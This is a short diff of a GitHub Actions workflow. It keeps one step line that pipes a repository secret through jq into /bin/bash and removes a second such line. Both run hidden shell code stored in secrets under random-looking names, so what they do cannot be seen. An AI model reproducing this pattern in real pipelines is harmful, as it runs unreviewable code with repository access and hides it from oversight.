@@ -21,7 +21,6 @@ jobs:
           kndr527: ${{ secrets.kndr527 }}
         run: |
           printf '%s' "$kndr527" | jq -r .k57989 | /bin/bash
-          printf '%s' "$wyhen8" | jq -r .iyhwz285 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
